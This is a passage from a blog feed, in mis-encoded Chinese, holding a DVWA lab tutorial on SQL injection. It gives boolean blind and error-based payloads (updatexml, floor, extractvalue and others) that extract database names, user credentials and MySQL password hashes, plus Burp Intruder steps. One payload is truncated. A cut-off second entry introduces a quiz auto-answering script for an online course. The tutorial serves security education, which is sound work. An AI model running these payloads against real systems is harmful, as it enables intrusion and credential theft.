invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥æ”¶ id çš„å€¼ï¼Œç›´æ¥å¸¦å…¥æŸ¥è¯¢ï¼Œå¦‚æœå­˜åœ¨å³è¿”å› users is exists in the database</p><p>å¦åˆ™æ˜¾ç¤º users id is missing åƒè¿™ç§åªæœ‰æ­£ç¡®ä¸é”™è¯¯é¡µé¢ã€‚é¡µé¢ä¸ä¼šæ˜¾ç¤ºæ•°æ®åº“</p><p>é‡Œä»»ä½•å†…å®¹ï¼Œå¦‚æœå­˜åœ¨æ³¨å…¥ï¼Œæˆä¸ºç›²æ³¨å…¥ã€‚</p><p>â€‹ç›²æ³¨å…¥çš„æ–¹æ³•æœ‰ä¸¤ç§ï¼šä¸€æ˜¯å¸ƒå°”å‹ç›²æ³¨å…¥ï¼ŒäºŒæ˜¯å»¶æ—¶æ³¨å…¥</p><h3 id="åˆ¤æ–­ç›²æ³¨å…¥"><a href="#åˆ¤æ–­ç›²æ³¨å…¥" class="headerlink" title="åˆ¤æ–­ç›²æ³¨å…¥"></a>åˆ¤æ–­ç›²æ³¨å…¥</h3><p>â€‹æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>1&#39; and &#39;1&#39;=&#39;1</code> å’Œ <code>1&#39; and &#39;1&#39;=&#39;2</code> æ˜¯å¦ä¸€æ · </p><p>â€‹ä»¥åŠ <code>1&#39; and sleep(10)--</code>è®©ä»–ç¡10såˆ¤æ–­æ˜¯å¦ä¸€æ · </p><h3 id="Booleanå¸ƒå°”å‹æ³¨å…¥æ”»å‡»"><a href="#Booleanå¸ƒå°”å‹æ³¨å…¥æ”»å‡»" class="headerlink" title="Booleanå¸ƒå°”å‹æ³¨å…¥æ”»å‡»"></a>Booleanå¸ƒå°”å‹æ³¨å…¥æ”»å‡»</h3><p>â€‹å› ä¸ºé¡µé¢ä¸ä¼šè¿”å›æŸ¥è¯¢çš„å†…å®¹æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨è”åˆæŸ¥è¯¢æ³¨å…¥æ”»å‡»ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ sqlæ¥è·å–æ•°æ®ã€‚</p><p>â€‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(1=1,1,0)--  -- ä¸‰ç›®è¿ç®—</span><br></pre></td></tr></table></figure><h3 id="å¸ƒå°”å‹ç›²æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯"><a href="#å¸ƒå°”å‹ç›²æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯" class="headerlink" title="å¸ƒå°”å‹ç›²æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯"></a>å¸ƒå°”å‹ç›²æ³¨å…¥è·å–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯</h3><p>â€‹åœ¨é»‘ç›’æµ‹è¯•ç¯å¢ƒä¸‹ï¼Œé€šè¿‡æ„é€ sqlè¯­å¥æ¥è¿›è¡Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚</p><p>æ„é€ sqlè¯­å¥å¸¸ç”¨çš„å‡½æ•°ï¼š</p><p>1.<code>SUBSTRING()</code>å­—ç¬¦ä¸²æˆªå–å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°å¼€å§‹æˆªå–ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æˆªå–çš„é•¿åº¦</p><p>æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„sqlè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT if(SUBSTRING(database(),1,1)=&#x27;d&#x27;,1,0)</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆªå–çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯â€˜dâ€™æˆ‘ä»¬è¿”å›1 å¦åˆ™è¿”å›0</p><p>æ­¤ç±»æ¨ã€‚å†åæ‹¼æ¥å­—ç¬¦å°±æ˜¯å®Œæ•´çš„åº“åã€‚</p><h2 id="é»‘ç›’æƒ…å†µä¸‹è¿›è¡Œå¸ƒå°”ç›²æ³¨å…¥"><a href="#é»‘ç›’æƒ…å†µä¸‹è¿›è¡Œå¸ƒå°”ç›²æ³¨å…¥" class="headerlink" title="é»‘ç›’æƒ…å†µä¸‹è¿›è¡Œå¸ƒå°”ç›²æ³¨å…¥"></a>é»‘ç›’æƒ…å†µä¸‹è¿›è¡Œå¸ƒå°”ç›²æ³¨å…¥</h2><p>æ­¥éª¤ï¼š</p><p>â€‹æˆ‘ä»¬é¦–å…ˆéœ€è¦åˆ¤æ–­æ³¨å…¥æ˜¯å¦ä¸ºå¸ƒå°”æ³¨å…¥ï¼Œåˆ¤æ–­å®Œåå°±å¯ä»¥è·å–æ•°æ®åº“çš„é•¿åº¦ï¼Œå¾—åˆ°é•¿åº¦å†æŸ¥è¯¢åº“åï¼Œç„¶åæŸ¥è¯¢è¡¨åï¼Œå­—æ®µï¼Œå­—æ®µå†…å®¹ã€‚ã€‚ã€‚</p><h3 id="å¸ƒå°”ç›²æ³¨å…¥æŸ¥è¯¢é•¿åº¦"><a href="#å¸ƒå°”ç›²æ³¨å…¥æŸ¥è¯¢é•¿åº¦" class="headerlink" title="å¸ƒå°”ç›²æ³¨å…¥æŸ¥è¯¢é•¿åº¦"></a>å¸ƒå°”ç›²æ³¨å…¥æŸ¥è¯¢é•¿åº¦</h3><p>â€‹é€šè¿‡æ„é€ å¦‚ä¸‹sqlè¯­å¥è¿›è¡Œæ•°æ®åº“é•¿åº¦çš„æŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=4,1,0)-- </span><br></pre></td></tr></table></figure><p>åˆ¤æ–­å‡ºé•¿åº¦ä¸º4</p><h3 id="å¸ƒå°”ç›²æ³¨å…¥åˆ¤æ–­åº“å"><a href="#å¸ƒå°”ç›²æ³¨å…¥åˆ¤æ–­åº“å" class="headerlink" title="å¸ƒå°”ç›²æ³¨å…¥åˆ¤æ–­åº“å"></a>å¸ƒå°”ç›²æ³¨å…¥åˆ¤æ–­åº“å</h3><p>è¿™ä¸€æ­¥æ“ä½œå…¶å®å°±æ˜¯é€šè¿‡éå†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</span><br></pre></td></tr></table></figure><p>ä¸è¯­å¥è¿›è¡Œæ•´åˆåˆ¤æ–­å‡ºæ˜¯å¦è¿”å›1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING(database(),1,1)=&#x27;$d&#x27;,1,0)-- </span><br></pre></td></tr></table></figure><p>å½“ç„¶äº†ï¼Œæˆ‘ä»¬æ‰‹åŠ¨è¿›è¡Œä¸€ä¸ªä¸€ä¸ªæµ‹è¯•è‚¯å®šå¾ˆæ…¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å€ŸåŠ©burpæ¥è¿›è¡Œå¦‚æ­¤æ“ä½œ</p><p>å¸¦æœ‰æ„é€ sqlè¯­å¥çš„url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.18.137/01/vulnerabilities/sqli_blind/?id=1%27%20and%20if(SUBSTRING(database(),1,1)=%27d%27,1,0)--%20&amp;Submit=Submit#</span><br></pre></td></tr></table></figure><p>å†burpé‡Œé¢æŠ“åŒ…ç„¶åé€å…¥intruder</p><p>å…ˆæ¸…é™¤å˜é‡ ç„¶åå†å°†æ•°å­—å’Œå­—æ¯è®¾ä¸ºå˜é‡ æ”»å‡»ç±»å‹é€‰æ‹© <code>cluster bomb</code></p><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232208426-323266936.png"></p><p>ç„¶åå°±æ˜¯payloadsé‡Œé¢ä¸¤ä¸ªå˜é‡çš„è®¾ç½® ç„¶åå¼€å§‹æ”»å‡»å°±è¡Œ è·‘å‡ºæ¥çš„çŠ¶æ€ç ä¸º200å³ä¸ºæˆåŠŸï¼</p><p>è·å¾—çš„æ•°æ®åº“åä¸º dvwa</p><p>æ¥ç€æˆ‘ä»¬é€šè¿‡åº“åæ¥è·å–è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)=&#x27;g&#x27;,1,0)-- </span><br></pre></td></tr></table></figure><p>åŒæ ·é€šè¿‡burpè¿›è¡ŒæŠ“åŒ…</p><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232216969-1395888437.png"></p><p>è·å–åˆ°è¡¨åguestbook</p><p>ç„¶åè·å–å­—æ®µå</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1,1),1,1)=&#x27;l&#x27;,1,0)-- </span><br></pre></td></tr></table></figure><p>åŒæ ·æˆ‘ä»¬ç”¨burpè¿›è¡Œçˆ†ç ´</p><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232228021-2082015114.png"></p><p>å¾—åˆ°å­—æ®µåä¸º<code>login  password</code>ç­‰<img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232302275-1126861267.png"></p><p>è·å¾—å®Œ</p><p>å­—æ®µå æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥è·å–å­—æ®µå†…å®¹ã€è´¦å·+å¯†ç ã€‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(SUBSTRING((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)-- </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232253962-1018686498.png"></p><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p>â€‹é¡¾åæ€ä¹‰æŠ¥é”™æ³¨å…¥å°±æ˜¯æŒ‡æ•°æ®åº“æ˜¾ç¤ºé”™è¯¯ï¼Œæ¯”å¦‚sqlè¯­æ³•é”™è¯¯</p><p>ä¸€èˆ¬å¯¹äºphpã€‚ç‰¹åˆ«php åœ¨æ‰§è¡Œ SQL è¯­å¥æ—¶ä¸€èˆ¬éƒ½ä¼šé‡‡ç”¨å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œæ•è·é”™è¯¯ä¿¡æ¯ã€‚åœ¨ php ä¸­ ä½¿ç”¨ <code>mysql_error()</code>å‡½æ•°</p><p>â€‹å¦‚æœåœ¨æŸ¥è¯¢æ³¨å…¥æ—¶å€™ä¼šæœ‰æŠ¥é”™ä¿¡æ¯è¿”å›ï¼Œå¯ä»¥é‡‡ç”¨æŠ¥é”™æ³¨å…¥</p><h3 id="æŠ¥é”™æ³¨å…¥åˆ†æ"><a href="#æŠ¥é”™æ³¨å…¥åˆ†æ" class="headerlink" title="æŠ¥é”™æ³¨å…¥åˆ†æ"></a>æŠ¥é”™æ³¨å…¥åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="comment"># getä¼ å…¥id å­—ç¬¦ä¸²å‹</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="comment"># mysqli_error å‡½æ•°è¿”å›é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æŠ¥é”™æ³¨å…¥æ”»å‡»"><a href="#æŠ¥é”™æ³¨å…¥æ”»å‡»" class="headerlink" title="æŠ¥é”™æ³¨å…¥æ”»å‡»"></a>æŠ¥é”™æ³¨å…¥æ”»å‡»</h3><p>â€‹åœ¨è¾“å…¥æ¡†è¾“å…¥æŠ¥é”™çš„sqlæ‹¼æ¥è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and info()-- </span><br></pre></td></tr></table></figure><p>å®ƒçš„åŸç†æ˜¯ä¸‹é¢ä¸€æ¡è¯­å¥ä¼šæ‰§è¡Œä½†æ˜¯ä¼šæŠ¥é”™ï¼Œåœ¨æŠ¥é”™ä¿¡æ¯ä¸­ä¼šè¿”å›æ•°æ®åº“åç§°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT first_name,last_name from users WHERE user_id=&#x27;1&#x27; and info()</span><br></pre></td></tr></table></figure><h3 id="æŠ¥é”™æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯"><a href="#æŠ¥é”™æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯" class="headerlink" title="æŠ¥é”™æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯"></a>æŠ¥é”™æ³¨å…¥è·å–æ•æ„Ÿä¿¡æ¯</h3><p>â€‹é€šè¿‡æ„é€ sqlè¯­å¥ï¼Œè¿”å›å¸¦æœ‰æ•°æ®åº“æ•æ„Ÿä¿¡æ¯çš„é”™è¯¯ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- </span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šè¿™é‡Œä¸ºä»€ä¹ˆè¦ç”¨<code>updatexml()</code>å‘¢ï¼Œé¦–å…ˆè¦å…ˆäº†è§£è¿™ä¸ªå‡½æ•°</p><blockquote><p>updatexml(xml_doument,XPath_string,new_value)<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</p></blockquote><p>ç®€å•ç‚¹è¯´ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬åˆ©ç”¨ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»è¦æ›´æ”¹ä¿¡æ¯çš„xpathè¯­å¥æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚</p><p>ä¸ºä»€ä¹ˆè¦åœ¨ç¬¬äºŒä¸ªå‚æ•°é‡Œé¢åŠ ä¸Šconcatè¯­å¥å‘¢ï¼Ÿå› ä¸ºupdatexmlï¼ˆï¼‰ç¬¬äºŒä¸ªå‚æ•°éœ€è¦è¿›è¡Œxpathæ ¡éªŒï¼Œå¦‚æœç¬¬äºŒä¸ªå‚æ•°å“ªé‡Œä¸æ˜¯xpathè¯­å¥å®ƒä¼šè¿›è¡Œä¸€æ¬¡æ ¡éªŒç„¶åæŠŠæ ¡éªŒåçš„<code>é”™è¯¯ä¿¡æ¯è¿”å›</code></p><blockquote><p>ä½†æ˜¯é‡‡ç”¨ updatexml æŠ¥é”™å‡½æ•° åªèƒ½æ˜¾ç¤º 32 é•¿åº¦çš„å†…å®¹ï¼Œå¦‚æœè·å–çš„å†…å®¹è¶…è¿‡ 32</p><p>å­—ç¬¦å°±è¦é‡‡ç”¨å­—ç¬¦ä¸²æˆªå–æ–¹æ³•ã€‚æ¯æ¬¡è·å– 32 ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</p><p>é™¤äº† updatexml å‡½æ•°æ”¯æŒæŠ¥é”™æ³¨å…¥å¤–ï¼Œmysql è¿˜æœ‰å¾ˆå¤šå‡½æ•°æ”¯æŒæŠ¥é”™ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2)) as x from information_schema.tables group by x)a);</span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure></blockquote><h3 id="åœ¨é»‘ç›’æ¨¡å¼ä¸‹è¿›è¡ŒæŠ¥é”™æ³¨å…¥"><a href="#åœ¨é»‘ç›’æ¨¡å¼ä¸‹è¿›è¡ŒæŠ¥é”™æ³¨å…¥" class="headerlink" title="åœ¨é»‘ç›’æ¨¡å¼ä¸‹è¿›è¡ŒæŠ¥é”™æ³¨å…¥"></a>åœ¨é»‘ç›’æ¨¡å¼ä¸‹è¿›è¡ŒæŠ¥é”™æ³¨å…¥</h3><p>â€‹æµç¨‹è¿˜æ˜¯æ ¹ä¹‹å‰ä¸€æ · åº“å-ã€‹è¡¨å-ã€‹å­—æ®µ-ã€‹å­—æ®µå†…å®¹</p><h4 id="è·å–åº“å"><a href="#è·å–åº“å" class="headerlink" title="è·å–åº“å"></a>è·å–åº“å</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,(select concat(&#x27;`&#x27;,(select database()),&#x27;`&#x27;)),1))-- </span><br></pre></td></tr></table></figure><h4 id="è·å–è¡¨å-è¿™æ¬¡ç”¨flooræŠ¥é”™ï¼ŒflooræŠ¥é”™ä¸ä¼šå‡ºç°é•¿åº¦é—®é¢˜"><a href="#è·å–è¡¨å-è¿™æ¬¡ç”¨flooræŠ¥é”™ï¼ŒflooræŠ¥é”™ä¸ä¼šå‡ºç°é•¿åº¦é—®é¢˜" class="headerlink" title="è·å–è¡¨å è¿™æ¬¡ç”¨flooræŠ¥é”™ï¼ŒflooræŠ¥é”™ä¸ä¼šå‡ºç°é•¿åº¦é—®é¢˜"></a>è·å–è¡¨å è¿™æ¬¡ç”¨flooræŠ¥é”™ï¼ŒflooræŠ¥é”™ä¸ä¼šå‡ºç°é•¿åº¦é—®é¢˜</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select 1 from (select count(*),concat((select (select(select distinct concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database() limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)-- </span><br></pre></td></tr></table></figure><p>è·å–è¡¨åä¸º guestbook å°†limit 0,1 æ”¹æˆ 1ï¼Œ1æ˜¯è·å–ç¬¬äºŒä¸ªè¡¨users</p><h4 id="è·å–å­—æ®µ"><a href="#è·å–å­—æ®µ" class="headerlink" title="è·å–å­—æ®µ"></a>è·å–å­—æ®µ</h4><p>è·å–usersç¬¬ä¸€ä¸ªå­—æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select 1 from(select count(*),,))</span><br></pre></td></tr></table></figure><p> è·å–è´¦å·å¯†ç </p><p>è·å–è´¦å·å’Œå¯†ç éœ€è¦rootæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select authentication_string from mysql.user limit 1;</span><br><span class="line">select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))</span><br><span class="line">select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232408409-1564081412.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ç½‘å®‰" scheme="http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"/>
    
  </entry>
  
  <entry>
    <title>ğŸ˜ colincoraçš„ä¼ æ™ºæ’­å®¢å°åŠ©æ‰‹ ğŸ˜</title>
    <link href="http://blog.ioimp.top/2022/08/17/%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2%E8%84%9A%E6%9C%AC%E5%88%B6%E4%BD%9C/"/>
    <id>http://blog.ioimp.top/2022/08/17/%E4%BC%A0%E6%99%BA%E6%92%AD%E5%AE%A2%E8%84%9A%E6%9C%AC%E5%88%B6%E4%BD%9C/</id>
    <published>2022-08-17T09:08:35.000Z</published>
    <updated>2023-08-17T09:34:18.269Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>è¿™æ˜¯ä¸€ä¸ªç”± colincora é­”æ”¹çš„ä¼ æ™ºæ’­å®¢å°åŠ©æ‰‹ï¼Œå…·å¤‡è‡ªåŠ¨è·³è§†é¢‘ã€è‡ªåŠ¨ç­”é¢˜ä»¥åŠå¯¹æ¥ä¸€ä¹‹é¢˜åº“çš„åŠŸèƒ½ã€‚</p><h2 id="åŠŸèƒ½ç‰¹ç‚¹"><a href="#åŠŸèƒ½ç‰¹ç‚¹" class="headerlink" title="åŠŸèƒ½ç‰¹ç‚¹"></a>åŠŸèƒ½ç‰¹ç‚¹</h2><ul><li>ğŸ“º è‡ªåŠ¨è·³è§†é¢‘ï¼šå°åŠ©æ‰‹å¯ä»¥è‡ªåŠ¨è·³è¿‡å·²è§‚çœ‹çš„è§†é¢‘ï¼Œå¸®åŠ©ä½ èŠ‚çœæ—¶é—´ã€‚</li><li>ğŸ“ è‡ªåŠ¨ç­”é¢˜ï¼šå°åŠ©æ‰‹å¯ä»¥è‡ªåŠ¨å›ç­”ä¸€ä¹‹é¢˜åº“ä¸­çš„é¢˜ç›®ï¼Œè®©ä½ è½»æ¾é€šè¿‡è€ƒè¯•ã€‚</li><li>ğŸ“š å¯¹æ¥ä¸€ä¹‹é¢˜åº“ï¼šå°åŠ©æ‰‹ä¸ä¸€ä¹‹é¢˜åº“å¯¹æ¥ï¼Œå¯ä»¥è·å–æœ€æ–°çš„é¢˜ç›®å’Œç­”æ¡ˆï¼Œä¿è¯ä½ è·å–åˆ°å‡†ç¡®çš„ä¿¡æ¯ã€‚</li></ul><h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><ol><li>é¦–å…ˆï¼Œç¡®ä¿ä½ å·²ç»å®‰è£…äº† æµè§ˆå™¨æ²¹çŒ´è„šæœ¬ã€<strong>Tampermonkey</strong>ã€‘,å¹¶ä¸”å¤åˆ¶è„šæœ¬ä»£ç åˆ°æ–°å»ºè„šæœ¬ã€‚</li><li></li><li>æ‰“å¼€ä¼ æ™ºæ’­å®¢çš„å­¦ä¹ 